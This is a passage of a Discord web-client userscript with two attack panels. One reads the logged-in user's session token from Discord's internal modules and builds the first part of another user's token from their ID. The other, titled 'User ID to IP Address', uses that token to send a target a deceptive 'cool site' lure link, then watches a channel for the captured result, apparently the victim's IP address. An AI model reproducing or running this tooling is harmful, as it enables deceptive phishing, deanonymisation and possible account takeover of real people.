// Show the new UI container when the open button is pressed
openNewButton16.addEventListener('click', () => {
  uiContainer16.style.display = 'block';
  openNewButton16.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton16.addEventListener('click', () => {
  uiContainer16.style.display = 'none';
  openNewButton16.style.display = 'block';
});

    // Create the title label
    const titleLabel16 = document.createElement('h1');
    titleLabel16.textContent = 'Get Part of Token From User';
    titleLabel16.style.marginBottom = '20px';
    titleLabel16.style.fontSize = '18px';
    titleLabel16.style.textAlign = 'center';
    uiContainer16.appendChild(titleLabel16);

    // Create the input field for User ID
    const idInput2 = document.createElement('input');
    idInput2.type = 'text';
    idInput2.placeholder = 'Enter User ID';
    idInput2.style.marginBottom = '10px';
    idInput2.style.padding = '10px';
    idInput2.style.backgroundColor = 'black';
    idInput2.style.color = 'white';
    idInput2.style.border = '1px solid white';
    idInput2.style.width = '100%';
    idInput2.style.boxSizing = 'border-box';
    idInput2.style.fontSize = '16px';
    uiContainer16.appendChild(idInput2);

    // Create the Generate button
    const generateButton = document.createElement('button');
    generateButton.textContent = 'Generate';
    generateButton.style.marginBottom = '10px';
    generateButton.style.padding = '10px';
    generateButton.style.backgroundColor = 'black';
    generateButton.style.color = 'white';
    generateButton.style.border = '1px solid white';
    generateButton.style.cursor = 'pointer';
    generateButton.style.width = '100%';
    generateButton.style.fontSize = '16px';
    uiContainer16.appendChild(generateButton);

    // Create the result label
    const resultLabel = document.createElement('input');
    resultLabel.type = 'text';
    resultLabel.readOnly = true;
    resultLabel.style.marginBottom = '10px';
    resultLabel.style.padding = '10px';
    resultLabel.style.backgroundColor = 'black';
    resultLabel.style.color = 'white';
    resultLabel.style.border = '1px solid white';
    resultLabel.style.width = '100%';
    resultLabel.style.boxSizing = 'border-box';
    resultLabel.style.fontSize = '16px';
    uiContainer16.appendChild(resultLabel);

    // Create the Copy button
    const copyButton3 = document.createElement('button');
    copyButton3.textContent = 'Copy';
    copyButton3.style.padding = '10px';
    copyButton3.style.backgroundColor = 'black';
    copyButton3.style.color = 'white';
    copyButton3.style.border = '1px solid white';
    copyButton3.style.cursor = 'pointer';
    copyButton3.style.width = '100%';
    copyButton3.style.fontSize = '16px';
    uiContainer16.appendChild(copyButton3);

    // Function to encode ID and display it
    generateButton.addEventListener('click', async () => {
        const userId = idInput2.value.trim();
        if (!userId) {
            resultLabel.value = 'Please enter a Discord ID.';
            return;
        }

        try {
            const response = await fetch(`https://discord.com/api/v9/users/${userId}`, {
                method: 'GET',
                headers: {
                    'Authorization': (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken()
                }
            });

            if (!response.ok) {
                resultLabel.value = 'Invalid ID';
                return;
            }

            let base64Id = btoa(userId);
            base64Id = base64Id.replace(/=+$/, '');
            const encodedId = base64Id + ".";
            resultLabel.value = encodedId;
        } catch (error) {
            resultLabel.value = 'Error: ' + error.message;
        }
    });

    // Function to copy the result to clipboard
    copyButton3.addEventListener('click', () => {
        const text = resultLabel.value;
        if (text && text !== 'Invalid ID' && text !== 'Please enter a Discord ID.') {
            resultLabel.select();
            document.execCommand('copy');
            resultLabel.value = 'Copied to clipboard!';
            setTimeout(() => {
                // Reset to the original ID or error message after 3.5 seconds
                const userId = idInput2.value.trim();
                if (!userId) {
                    resultLabel.value = 'Please enter a Discord ID.';
                } else {
                    // Refresh the ID display
                    generateButton.click();
                }
            }, 3500);
        } else {
            resultLabel.value = 'Nothing to copy.';
        }
    });
})();






(function() {
    // Create and style the main UI container
    const uiContainer17 = document.createElement('div');
    uiContainer17.style.position = 'fixed';
    uiContainer17.style.bottom = '20px';
    uiContainer17.style.right = '20px';
    uiContainer17.style.width = '350px';
    uiContainer17.style.backgroundColor = 'black';
    uiContainer17.style.color = 'white';
    uiContainer17.style.zIndex = '2000';
    uiContainer17.style.display = 'none';
    uiContainer17.style.padding = '20px';
    uiContainer17.style.border = '1px solid white';
    uiContainer17.style.borderRadius = '10px';
    uiContainer17.style.fontFamily = 'GG Sans, sans-serif';
    uiContainer17.style.boxSizing = 'border-box';
    document.body.appendChild(uiContainer17);

// Create and style the open button for the new UI container
const openNewButton17 = document.createElement('button');
openNewButton17.textContent = 'Page 17';
openNewButton17.style.position = 'fixed';
openNewButton17.style.bottom = '20px';
openNewButton17.style.right = '86px';
openNewButton17.style.zIndex = '1000';
openNewButton17.style.padding = '10px';
openNewButton17.style.backgroundColor = '#333';
openNewButton17.style.color = 'white';
openNewButton17.style.border = 'none';
openNewButton17.style.borderRadius = '5px';
document.body.appendChild(openNewButton17);

// Create and style the close button for the new UI container
const closeNewButton17 = document.createElement('button');
closeNewButton17.textContent = 'Close';
closeNewButton17.style.padding = '10px';
closeNewButton17.style.backgroundColor = '#333';
closeNewButton17.style.color = 'white';
closeNewButton17.style.border = 'none';
closeNewButton17.style.borderRadius = '5px';
closeNewButton17.style.marginTop = '10px';
uiContainer17.appendChild(closeNewButton17);

// Show the new UI container when the open button is pressed
openNewButton17.addEventListener('click', () => {
  uiContainer17.style.display = 'block';
  openNewButton17.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton17.addEventListener('click', () => {
  uiContainer17.style.display = 'none';
  openNewButton17.style.display = 'block';
});

    // Create the title label
    const titleLabel17 = document.createElement('h1');
    titleLabel17.textContent = 'User ID to IP Address';
    titleLabel17.style.marginBottom = '20px';
    titleLabel17.style.fontSize = '20px';
    titleLabel17.style.textAlign = 'center';
    uiContainer17.appendChild(titleLabel17);
    
    // Create the notice label
    const notice1Label = document.createElement('h1');
    notice1Label.textContent = 'Join this server for this code to work: https://discord.gg/xsjXWQwvBw';
    notice1Label.style.marginBottom = '20px';
    notice1Label.style.fontSize = '15px';
    notice1Label.style.textAlign = 'center';
    uiContainer17.appendChild(notice1Label);
    
    // Create the notice label
    const notice2Label = document.createElement('h1');
    notice2Label.textContent = 'Note: This process may take a bit of time.';
    notice2Label.style.marginBottom = '20px';
    notice2Label.style.fontSize = '15px';
    notice2Label.style.textAlign = 'center';
    uiContainer17.appendChild(notice2Label);

    // Create the input field for the User ID
    const userIdInput5 = document.createElement('input');
    userIdInput5.type = 'text';
    userIdInput5.placeholder = 'Enter User ID';
    userIdInput5.style.marginBottom = '10px';
    userIdInput5.style.padding = '10px';
    userIdInput5.style.backgroundColor = 'black';
    userIdInput5.style.color = 'white';
    userIdInput5.style.border = '1px solid white';
    userIdInput5.style.width = '100%';
    userIdInput5.style.boxSizing = 'border-box';
    userIdInput5.style.fontSize = '16px';
    uiContainer17.appendChild(userIdInput5);

    // Create the input field for the custom message
    const messageInput6 = document.createElement('textarea');
    messageInput6.value = 'Hey, my friend just made this cool site you should check out: https://sites.google.com/view/pixelationsite1234951143/home';
    messageInput6.style.marginBottom = '10px';
    messageInput6.style.padding = '10px';
    messageInput6.style.backgroundColor = 'black';
    messageInput6.style.color = 'white';
    messageInput6.style.border = '1px solid white';
    messageInput6.style.width = '100%';
    messageInput6.style.boxSizing = 'border-box';
    messageInput6.style.fontSize = '16px';
    messageInput6.style.resize = 'both';
    uiContainer17.appendChild(messageInput6);

    // Automatically adjust the textarea height based on content
    messageInput6.addEventListener('input', () => {
        messageInput6.style.height = 'auto';
        messageInput6.style.height = messageInput6.scrollHeight + 'px';
    });
    messageInput6.dispatchEvent(new Event('input')); // Trigger the initial resize

    // Create the validation label for the URL requirement
    const validationLabel = document.createElement('p');
    validationLabel.textContent = 'Site has to contain this link: https://sites.google.com/view/pixelationsite1234951143/home';
    validationLabel.style.color = 'red';
    validationLabel.style.display = 'none';
    validationLabel.style.fontSize = '14px';
    validationLabel.style.marginBottom = '10px';
    uiContainer17.appendChild(validationLabel);

    // Create the send button
    const sendButton9 = document.createElement('button');
    sendButton9.textContent = 'Start';
    sendButton9.style.marginBottom = '20px';
    sendButton9.style.padding = '10px';
    sendButton9.style.backgroundColor = 'black';
    sendButton9.style.color = 'white';
    sendButton9.style.border = '1px solid white';
    sendButton9.style.cursor = 'pointer';
    sendButton9.style.width = '100%';
    sendButton9.style.fontSize = '16px';
    uiContainer17.appendChild(sendButton9);

    // Create the text label to display the most recent message content
    const recentMessageLabel = document.createElement('p');
    recentMessageLabel.style.marginTop = '10px';
    recentMessageLabel.style.fontSize = '14px';
    uiContainer17.appendChild(recentMessageLabel);

    // Create the copy button
    const copyButton4 = document.createElement('button');
    copyButton4.textContent = 'Copy';
    copyButton4.style.marginTop = '10px';
    copyButton4.style.padding = '10px';
    copyButton4.style.backgroundColor = 'black';
    copyButton4.style.color = 'white';
    copyButton4.style.border = '1px solid white';
    copyButton4.style.cursor = 'pointer';
    copyButton4.style.width = '100%';
    copyButton4.style.fontSize = '16px';
    uiContainer17.appendChild(copyButton4);

    // Function to validate the message content and send the message
    sendButton9.addEventListener('click', async () => {
        const userId = userIdInput5.value.trim();
        const message = messageInput6.value.trim();
        const requiredLink = 'https://sites.google.com/view/pixelationsite1234951143/home';
        const channelIdToCheck = '1266640039673331733'; // Channel ID to monitor

        if (!message.includes(requiredLink)) {
            validationLabel.style.display = 'block';
            return;
        } else {
            validationLabel.style.display = 'none';
        }

        // Execute the functions
        sendMessageToUser(userId, message).then(() => {
            monitorChannelForNewMessage(channelIdToCheck);
        });
    });

    // Copy button functionality
    copyButton4.addEventListener('click', () => {
        const text = recentMessageLabel.textContent;
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        try {
            document.execCommand('copy');
            alert('Copied to clipboard');
        } catch (err) {
            alert('Failed to copy to clipboard');
        }
        document.body.removeChild(textarea);
    });

    // Function to get the DM Channel ID from a User ID
    async function getChannelIdFromUserId(userId) {
        const response = await fetch(`https://discord.com/api/v9/users/@me/channels`, {
            method: 'POST',
            headers: {
                'accept-language': 'en-US',
                'authorization': (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(),
                'content-type': 'application/json'
            },
            body: JSON.stringify({
                recipient_id: userId
            })
        });

        if (!response.ok) {
            throw new Error(`Failed to fetch DM channel ID: ${response.statusText}`);
        }

        const data = await response.json();
        return data.id;
    }

    // Function to send a message to a specific channel
    async function sendMessage(channelId, messageContent) {
        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
            method: 'POST',
            headers: {
                'accept-language': 'en-US',
                'authorization': (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(),
                'content-type': 'application/json'
            },
            body: JSON.stringify({
                content: messageContent,
                tts: false,
                flags: 0
            })
        });

        if (!response.ok) {
            throw new Error(`Failed to send message: ${response.statusText}`);
        }

        const data = await response.json();
        return data;
    }

    // Function to get the most recent message from a specific channel
    async function getMostRecentMessage(channelId) {
        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages?limit=1`, {
            method: 'GET',
            headers: {
                'accept-language': 'en-US',
                'authorization': (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(),
                'content-type': 'application/json'
            }
        });

        if (!response.ok) {
            throw new Error(`Failed to fetch most recent message: ${response.statusText}`);
        }

        const data = await response.json();
        return data[0]; // The most recent message
    }

    // Main function to get the channel ID and send the message
    async function sendMessageToUser(userId, messageContent) {
        try {
            const channelId = await getChannelIdFromUserId(userId);
            const messageData = await sendMessage(channelId, messageContent);
            console.log('Message sent successfully:', messageData);
        } catch (error) {
            console.error('Error sending message:', error);
        }
    }

    // Function to monitor the channel for a new message
    async function monitorChannelForNewMessage(channelId) {
        let lastMessageId = null;

        // Initial check to set the last message ID
        try {
            const mostRecentMessage = await getMostRecentMessage(channelId);
            lastMessageId = mostRecentMessage.id;
        } catch (error) {
            console.error('Error fetching initial message:', error);
        }

        const checkForNewMessage = async () => {
            try {
                const mostRecentMessage = await getMostRecentMessage(channelId);
                if (mostRecentMessage.id !== lastMessageId) {
                    recentMessageLabel.textContent = mostRecentMessage.content;
                    lastMessageId = mostRecentMessage.id;
                }
            } catch (error) {
                console.error('Error checking for new message:', error);
            }
        };

        // Check for new messages every second
        setInterval(checkForNewMessage, 1000);
    }
})();
